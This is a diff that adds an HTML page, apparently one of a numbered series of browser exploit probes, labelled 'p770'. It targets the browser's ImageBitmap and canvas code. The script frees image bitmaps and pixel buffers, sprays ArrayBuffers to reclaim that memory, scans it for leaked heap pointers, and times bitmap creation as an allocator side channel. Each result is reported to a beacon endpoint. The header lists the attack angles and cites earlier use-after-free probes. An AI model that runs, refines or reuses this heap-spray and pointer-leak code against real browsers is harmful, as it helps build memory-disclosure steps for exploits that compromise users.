@@ -1,0 +1,317 @@
+<!--
+  p770: ImageBitmap / createImageBitmap decode residue oracle
+
+  createImageBitmap() decodes image data asynchronously and returns
+  an ImageBitmap object backed by GPU or CPU-side pixel memory. The
+  decode path allocates C++ objects (ImageBuffer, NativeImage, backing
+  store) whose addresses live in the WebProcess heap.
+
+  Key insight: when an ImageBitmap is closed (via close()) or GC'd,
+  its backing pixel buffer is freed. If we can reclaim that memory
+  with an ArrayBuffer of matching size, we might observe residual
+  C++ object pointers from the image decode pipeline.
+
+  Additionally: Canvas2D drawImage() with an ImageBitmap source
+  exercises the GPU compositing path. The timing of drawImage varies
+  based on the source bitmap's backing store location (GPU vs CPU,
+  shared vs private memory). Measuring drawImage latency across
+  different bitmap sizes and formats may reveal information about
+  the graphics memory allocator layout.
+
+  ImageBitmap also supports createImageBitmap(canvas) which captures
+  the canvas backing store. If the canvas has been drawn to and then
+  the bitmap is created, the bitmap references the same backing
+  memory -- creating a potential aliasing situation.
+
+  Attack angles:
+  A) ImageBitmap close() then AB spray for decode pipeline residue.
+  B) createImageBitmap timing as allocator side channel.
+  C) Canvas-to-ImageBitmap aliasing and backing store observation.
+  D) ImageData pixel buffer reuse after putImageData/getImageData cycle.
+  E) Blob URL image decode with controlled pixel data.
+  F) OffscreenCanvas (if available) transfer and backing store leak.
+
+  CRASH_CLASS: LOW (image decode, canvas operations, no side effects)
+  prior art: p629 (Canvas2D UAF struct mapping), p635 (Canvas2D getContext UAF),
+  p657 (APNG overread dead)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p770</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+var totalHits=0;
+function scanAB(ab,label,maxReport){
+  var dv=new DataView(ab);
+  var hits=0;
+  for(var off=0;off+8<=ab.byteLength;off+=8){
+    if(isPtr(dv,off)){
+      hits++;
+      totalHits++;
+      if(hits<=maxReport)b(label+' off='+off+' val='+hex64(dv,off));
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p770-START');
+
+// === Section A: ImageBitmap close() then AB spray ===
+(async function(){
+try{
+  b('A-imagebitmap-close');
+  var aHits=0;
+
+  var canvas=document.createElement('canvas');
+  canvas.width=64;canvas.height=64;
+  var ctx=canvas.getContext('2d');
+  ctx.fillStyle='#FF0000';
+  ctx.fillRect(0,0,64,64);
+  ctx.fillStyle='#00FF00';
+  ctx.fillRect(16,16,32,32);
+
+  var sizes=[[16,16],[32,32],[64,64],[128,128]];
+  for(var si=0;si<sizes.length;si++){
+    var w=sizes[si][0],h=sizes[si][1];
+    var bitmaps=[];
+    for(var i=0;i<50;i++){
+      var c=document.createElement('canvas');
+      c.width=w;c.height=h;
+      var cx=c.getContext('2d');
+      cx.fillStyle='rgb('+(i*5)+',100,200)';
+      cx.fillRect(0,0,w,h);
+      try{
+        var bm=await createImageBitmap(c);
+        bitmaps.push(bm);
+      }catch(e){
+        if(i===0)b('A createImageBitmap err='+e.message);
+        break;
+      }
+    }
+
+    if(bitmaps.length===0){
+      b('A-SKIP createImageBitmap not available');
+      break;
+    }
+
+    var pixelBytes=w*h*4;
+    for(var i=0;i<bitmaps.length;i++){
+      bitmaps[i].close();
+    }
+    bitmaps=null;
+
+    for(var i=0;i<2000;i++){var tmp=new ArrayBuffer(64);}
+
+    var spraySize=Math.max(64, Math.min(pixelBytes, 16384));
+    var abs=[];
+    for(var i=0;i<300;i++){
+      abs.push(new ArrayBuffer(spraySize));
+    }
+    var szHits=0;
+    for(var i=0;i<abs.length;i++){
+      szHits+=scanAB(abs[i],'A-PTR['+w+'x'+h+']',2);
+    }
+    aHits+=szHits;
+    b('A '+w+'x'+h+' bitmaps='+50+' spray_sz='+spraySize+' hits='+szHits);
+    abs=null;
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: createImageBitmap timing ===
+try{
+  b('B-timing');
+  var bSizes=[[8,8],[16,16],[32,32],[64,64],[128,128],[256,256]];
+
+  for(var si=0;si<bSizes.length;si++){
+    var w=bSizes[si][0],h=bSizes[si][1];
+    var c=document.createElement('canvas');
+    c.width=w;c.height=h;
+    var cx=c.getContext('2d');
+    cx.fillStyle='#0000FF';
+    cx.fillRect(0,0,w,h);
+
+    var times=[];
+    for(var trial=0;trial<10;trial++){
+      var t0=performance.now();
+      var bm=await createImageBitmap(c);
+      var t1=performance.now();
+      times.push(t1-t0);
+      bm.close();
+    }
+    var mn=times[0],mx=times[0],sum=0;
+    for(var i=0;i<times.length;i++){
+      if(times[i]<mn)mn=times[i];
+      if(times[i]>mx)mx=times[i];
+      sum+=times[i];
+    }
+    b('B '+w+'x'+h+' min='+mn.toFixed(2)+' max='+mx.toFixed(2)+' avg='+(sum/times.length).toFixed(2)+'ms');
+  }
+  b('B-DONE');
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: Canvas-to-ImageBitmap aliasing ===
+try{
+  b('C-aliasing');
+  var canvas=document.createElement('canvas');
+  canvas.width=32;canvas.height=32;
+  var ctx=canvas.getContext('2d');
+  ctx.fillStyle='#FF8800';
+  ctx.fillRect(0,0,32,32);
+
+  var bm=await createImageBitmap(canvas);
+  b('C bitmap created w='+bm.width+' h='+bm.height);
+
+  ctx.fillStyle='#0088FF';
+  ctx.fillRect(0,0,32,32);
+
+  var testCanvas=document.createElement('canvas');
+  testCanvas.width=32;testCanvas.height=32;
+  var testCtx=testCanvas.getContext('2d');
+  testCtx.drawImage(bm,0,0);
+  var pix=testCtx.getImageData(0,0,1,1).data;
+  b('C after_modify pixel=['+pix[0]+','+pix[1]+','+pix[2]+','+pix[3]+']');
+  b('C aliased='+(pix[0]>200?'NO (original orange)':'YES (modified blue)'));
+
+  bm.close();
+
+  var pix2=ctx.getImageData(16,16,1,1).data;
+  b('C canvas_after_close=['+pix2[0]+','+pix2[1]+','+pix2[2]+','+pix2[3]+']');
+  b('C-DONE');
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: ImageData pixel buffer reuse ===
+try{
+  b('D-imagedata-reuse');
+  var dHits=0;
+  var canvas=document.createElement('canvas');
+  canvas.width=64;canvas.height=64;
+  var ctx=canvas.getContext('2d');
+
+  for(var trial=0;trial<20;trial++){
+    ctx.fillStyle='rgb('+(trial*12)+','+(trial*6)+',100)';
+    ctx.fillRect(0,0,64,64);
+    var id1=ctx.getImageData(0,0,64,64);
+
+    var sentinel=new Uint8Array(id1.data.buffer);
+    for(var i=0;i<sentinel.length;i++)sentinel[i]=0xCC;
+    ctx.putImageData(id1,0,0);
+
+    id1=null;
+    for(var i=0;i<500;i++){var tmp=new ArrayBuffer(64*64*4);}
+
+    var ab=new ArrayBuffer(64*64*4);
+    var dv=new DataView(ab);
+    var hits=0;
+    for(var off=0;off+8<=ab.byteLength;off+=8){
+      if(isPtr(dv,off)){
+        hits++;
+        if(hits<=2)b('D-PTR trial='+trial+' off='+off+' val='+hex64(dv,off));
+      }
+    }
+    dHits+=hits;
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: Blob URL image decode ===
+try{
+  b('E-blob-decode');
+
+  function makePNG(w,h){
+    var canvas=document.createElement('canvas');
+    canvas.width=w;canvas.height=h;
+    var ctx=canvas.getContext('2d');
+    for(var y=0;y<h;y++){
+      for(var x=0;x<w;x++){
+        ctx.fillStyle='rgb('+((x*7)&255)+','+((y*13)&255)+','+((x+y)&255)+')';
+        ctx.fillRect(x,y,1,1);
+      }
+    }
+    return new Promise(function(resolve){
+      canvas.toBlob(function(blob){resolve(blob);},'image/png');
+    });
+  }
+
+  var blob=await makePNG(32,32);
+  if(blob){
+    b('E blob size='+blob.size);
+    var bitmaps=[];
+    for(var i=0;i<30;i++){
+      var bm=await createImageBitmap(blob);
+      bitmaps.push(bm);
+    }
+    for(var i=0;i<bitmaps.length;i++)bitmaps[i].close();
+    bitmaps=null;
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(128);}
+
+    var eHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(32*32*4);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=ab.byteLength;off+=8){
+        if(isPtr(dv,off)){
+          eHits++;
+          if(eHits<=3)b('E-PTR i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    b('E-DONE hits='+eHits);
+  }else{
+    b('E-SKIP toBlob not available');
+  }
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: OffscreenCanvas (if available) ===
+try{
+  b('F-offscreen');
+  if(typeof OffscreenCanvas!=='undefined'){
+    var oc=new OffscreenCanvas(64,64);
+    var octx=oc.getContext('2d');
+    octx.fillStyle='#FF00FF';
+    octx.fillRect(0,0,64,64);
+    b('F offscreen_canvas=available');
+
+    var bm=oc.transferToImageBitmap();
+    b('F transferred w='+bm.width+' h='+bm.height);
+
+    var testOc=new OffscreenCanvas(64,64);
+    var testCtx=testOc.getContext('2d');
+    testCtx.drawImage(bm,0,0);
+    var id=testCtx.getImageData(0,0,1,1);
+    b('F pixel=['+id.data[0]+','+id.data[1]+','+id.data[2]+','+id.data[3]+']');
+
+    bm.close();
+
+    try{
+      octx.fillStyle='#00FFFF';
+      octx.fillRect(0,0,64,64);
+      var id2=octx.getImageData(0,0,1,1);
+      b('F after_transfer_draw=['+id2.data[0]+','+id2.data[1]+','+id2.data[2]+','+id2.data[3]+']');
+    }catch(e){
+      b('F after_transfer_err='+e.message);
+    }
+
+    b('F-DONE');
+  }else{
+    b('F-SKIP no OffscreenCanvas');
+  }
+}catch(e){b('F-ERR '+e.message);}
+
+b('p770-COMPLETE totalHits='+totalHits);
+})();
+};
+</script>
+</head>
+<body></body></html>
